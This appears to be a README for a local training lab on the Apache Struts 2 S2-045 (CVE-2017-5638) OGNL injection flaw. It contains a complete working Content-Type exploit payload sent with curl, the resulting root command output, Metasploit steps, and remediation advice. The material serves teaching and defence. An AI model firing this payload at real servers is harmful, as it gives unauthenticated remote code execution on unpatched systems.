# Apache Struts 2 (S2-045 / CVE-2017-5638): Jakarta Multipart Parser OGNL Injection RCE

## Overview

Apache Struts 2 vulnerability S2-045 (CVE-2017-5638) is an infamous enterprise Java Remote Code Execution vulnerability responsible for the historic 2017 Equifax data breach affecting over 147 million consumers.

The vulnerability resides within the **Jakarta Multipart parser** used by Struts 2 for processing file uploads. When a client submits an invalid or malformed HTTP `Content-Type` header during an upload attempt, the Jakarta parser generates an internal error message. To format this error, Struts 2 invokes the **OGNL (Object Graph Navigation Library)** expression evaluator on the invalid header string. By supplying crafted OGNL expressions inside `Content-Type`, attackers gain arbitrary remote code execution under the Java process privileges without authentication.

- **Primary Interface**: `http://localhost:8121`
- **Docker Shortcut**: `./lab start struts2-s2045`
- **Container Name**: `cyberlab_04_struts2_s2045`
- **RAM Footprint**: ~400 MB (Tomcat 8 + Struts 2.3.30)

---

## Architecture & Vulnerability Mechanism

```
+-------------------------------------------------------------+
|                Unauthenticated Attacker Request             |
+-------------------------------------------------------------+
                               |
                   POST /orders/3 HTTP/1.1
                   Content-Type: %{(#_memberAccess['allowStaticMethodAccess']=true).
                   (#cmd='id').(#iswin=(@java.lang.System@getProperty('os.name').
                   toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:
                   {'/bin/sh','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).
                   (#p.redirectErrorStream(true)).(#process=#p.start()).
                   (#ros=(@org.apache.struts2.ServletActionContext@getResponse().
                   getOutputStream())).(@org.apache.commons.io.IOUtils@copy(
                   #process.getInputStream(),#ros)).(#ros.flush())}
                               v
+-------------------------------------------------------------+
|               Jakarta Multipart Parser Exception            |
|                                                             |
|  1. Recognizes invalid Content-Type value                   |
|  2. Calls LocalizedTextUtil.findText() with message string  |
|  3. Passes message into OgnlUtil.getValue()                 |
|  4. OGNL Engine executes Java ProcessBuilder payload        |
|                                                             |
|  [Result: Remote OS Command Execution inside Tomcat JVM]    |
+-------------------------------------------------------------+
```

---

## Exploitation Walkthrough

### 1. Verification of Vulnerability via Python / Curl

Send a single HTTP request containing an OGNL command execution payload inside the `Content-Type` header:

```bash
curl -i -s -k -X POST 'http://localhost:8121/orders/3' \
  -H "User-Agent: Mozilla/5.0" \
  -H "Content-Type: %{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='id; uname -a').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/sh','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}"
```

The response output immediately returns:

```text
uid=0(root) gid=0(root) groups=0(root)
Linux cyberlab_04_struts2_s2045 ...
```

### 2. Automated Metasploit Exploitation

```bash
msfconsole -q
use exploit/multi/http/struts2_content_type_ognl
set RHOSTS 127.0.0.1
set RPORT 8121
set TARGETURI /
exploit
```

---

## Defensive Remediation & Hardening

1. **Upgrade Struts 2**:
   Upgrade to Apache Struts 2.3.32 or 2.5.10.1 or newer.
2. **Alternative Multipart Parser**:
   Switch the multipart parser from Jakarta to Pell by setting in `struts.xml`:
   ```xml
   <constant name="struts.multipart.parser" value="pell" />
   ```
3. **Strict Content-Type Validation at Reverse Proxy**:
   Configure Nginx or your WAF to drop any request where `Content-Type` does not match standard MIME patterns (`^[a-zA-Z0-9_-]+/[a-zA-Z0-9_-]+.*$`).

---

## Video Walkthroughs & Technical References

- [Apache Struts Exploitation | CTF Walkthrough](https://www.youtube.com/watch?v=N1PNWpCmUwo)
- [Vulhub Struts 2 S2-045 Advisory](https://vulhub.org/#/environments/struts2/s2-045/)
- [Apache Software Foundation Security Bulletin S2-045](https://cwiki.apache.org/confluence/display/WW/S2-045)
